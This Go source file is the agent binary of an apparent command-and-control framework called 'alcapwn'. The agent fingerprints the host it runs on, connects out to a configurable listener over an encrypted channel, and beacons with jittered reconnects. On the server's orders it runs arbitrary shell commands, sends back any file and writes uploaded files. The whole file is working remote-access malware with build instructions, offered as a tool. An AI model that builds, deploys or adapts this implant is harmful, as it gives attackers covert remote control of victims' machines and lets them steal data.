// Package main is the alcapwn agent binary.
//
// Build-time configuration is injected via -ldflags:
//
//	go build -ldflags "-s -w \
//	    -X main.lhost=10.0.0.1 \
//	    -X main.lport=4444 \
//	    -X main.interval=60 \
//	    -X main.jitter=20" \
//	    ./agent/
//
// The agent:
//  1. Dials the server on connect.
//  2. Sends a Hello with host fingerprint and metadata.
//  3. Receives a Welcome with a session ID and suggested reconnect interval.
//  4. Enters a full-duplex task loop: executes Tasks, returns Results, sends
//     periodic Pings to keep the connection alive.
//  5. On any error, sleeps interval+jitter seconds and reconnects from step 1.
package main

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"sync/atomic"
	"time"

	"alcapwn/proto"
)

// Build-time variables.  Overridden with -ldflags at generate time.
//
//	-X main.lhost=10.0.0.1
//	-X main.lport=4444
//	-X main.interval=60
//	-X main.jitter=20
//	-X main.serverFingerprint=<sha256-hex-of-server-pubkey>
var (
	lhost             = "127.0.0.1"
	lport             = "4444"
	interval          = "60"
	jitter            = "20"
	serverFingerprint = "" // leave empty to skip pinning (insecure; dev only)
)

const agentVersion = "v3"

func main() {
	h := buildHello()
	ivSec := parseInt(interval, 60)
	jitPct := parseInt(jitter, 20)

	for {
		if err := runSession(h); err != nil && isDebug() {
			fmt.Fprintf(os.Stderr, "[alcapwn-agent] session error: %v\n", err)
		}
		jitteredSleep(ivSec, jitPct)
	}
}

// buildHello constructs the agent's identity payload sent on every connect.
func buildHello() proto.Hello {
	hostname, _ := os.Hostname()
	uid := ""
	username := ""
	if u, err := user.Current(); err == nil {
		uid = u.Uid
		username = u.Username
	}
	return proto.Hello{
		Version:   agentVersion,
		MachineID: machineID(),
		Hostname:  hostname,
		OS:        runtime.GOOS,
		Arch:      runtime.GOARCH,
		User:      username,
		UID:       uid,
	}
}

// runSession dials the server, completes the encrypted handshake, and runs
// the task loop until the connection closes or an error occurs.
func runSession(hello proto.Hello) error {
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(lhost, lport), 10*time.Second)
	if err != nil {
		return err
	}
	defer conn.Close()

	// Write the 4-byte ALCA routing tag so the server's acceptLoop identifies
	// this as an agent connection before performing the key exchange.
	if _, err := conn.Write(proto.Magic[:]); err != nil {
		return fmt.Errorf("routing tag: %w", err)
	}

	// X25519 handshake → AES-256-GCM session.
	// serverFingerprint may be "" in development builds (skips pinning).
	cs, err := proto.NewClientCryptoSession(conn, serverFingerprint)
	if err != nil {
		return fmt.Errorf("crypto handshake: %w", err)
	}

	if err := proto.WriteMsgEncrypted(conn, cs, proto.MsgHello, hello); err != nil {
		return fmt.Errorf("hello: %w", err)
	}

	env, err := proto.ReadMsgEncrypted(conn, cs)
	if err != nil {
		return fmt.Errorf("welcome: %w", err)
	}
	if env.Type != proto.MsgWelcome {
		return fmt.Errorf("expected welcome, got %s", env.Type)
	}
	var welcome proto.Welcome
	if err := json.Unmarshal(env.Data, &welcome); err != nil {
		return fmt.Errorf("welcome decode: %w", err)
	}

	return taskLoop(conn, cs)
}

// taskLoop is the main agent event loop.  It reads Tasks from the server and
// writes Results back.  A Ping is sent every 30 seconds to detect stale connections.
// All messages are encrypted via cs.
func taskLoop(conn net.Conn, cs *proto.CryptoSession) error {
	pingTick := time.NewTicker(30 * time.Second)
	defer pingTick.Stop()

	msgCh := make(chan *proto.Envelope, 4)
	errCh := make(chan error, 1)
	var closed atomic.Bool

	// Read goroutine: decrypts incoming frames and forwards them.
	go func() {
		for {
			env, err := proto.ReadMsgEncrypted(conn, cs)
			if err != nil {
				if !closed.Load() {
					errCh <- err
				}
				return
			}
			msgCh <- env
		}
	}()

	for {
		select {
		case err := <-errCh:
			return err

		case <-pingTick.C:
			if err := proto.WriteMsgEncrypted(conn, cs, proto.MsgPing, struct{}{}); err != nil {
				closed.Store(true)
				return err
			}

		case env := <-msgCh:
			switch env.Type {
			case proto.MsgPong:
				// heartbeat acknowledged — nothing to do

			case proto.MsgTask:
				var task proto.Task
				if err := json.Unmarshal(env.Data, &task); err != nil {
					continue
				}
				res := executeTask(task)
				if err := proto.WriteMsgEncrypted(conn, cs, proto.MsgResult, res); err != nil {
					closed.Store(true)
					return err
				}
			}
		}
	}
}

// executeTask runs a single Task and returns its Result.
func executeTask(task proto.Task) proto.Result {
	res := proto.Result{TaskID: task.ID}

	switch task.Kind {
	case proto.TaskExec:
		out, err := runShell(task.Command)
		res.Output = out
		if err != nil {
			if ee, ok := err.(*exec.ExitError); ok {
				res.Exit = ee.ExitCode()
			} else {
				res.Error = err.Error()
			}
		}

	case proto.TaskDownload:
		data, err := os.ReadFile(task.Path)
		if err != nil {
			res.Error = err.Error()
		} else {
			res.Output = data
		}

	case proto.TaskUpload:
		if err := os.WriteFile(task.Path, task.Data, 0644); err != nil {
			res.Error = err.Error()
		}

	default:
		res.Error = fmt.Sprintf("unknown task kind: %s", task.Kind)
	}

	return res
}

// runShell executes command via the system shell and returns combined output.
func runShell(command string) ([]byte, error) {
	shell := "/bin/sh"
	if sh := os.Getenv("SHELL"); sh != "" {
		shell = sh
	}
	return exec.Command(shell, "-c", command).CombinedOutput()
}

// jitteredSleep sleeps for intervalSec plus up to jitterPct% additional time.
func jitteredSleep(intervalSec, jitterPct int) {
	base := time.Duration(intervalSec) * time.Second
	if jitterPct > 0 {
		maxJitter := int64(float64(base) * float64(jitterPct) / 100.0)
		if maxJitter > 0 {
			base += time.Duration(rand.Int63n(maxJitter))
		}
	}
	time.Sleep(base)
}

func parseInt(s string, def int) int {
	var v int
	if n, _ := fmt.Sscan(s, &v); n == 1 && v > 0 {
		return v
	}
	return def
}

func isDebug() bool {
	return os.Getenv("ALCAPWN_DEBUG") == "1"
}
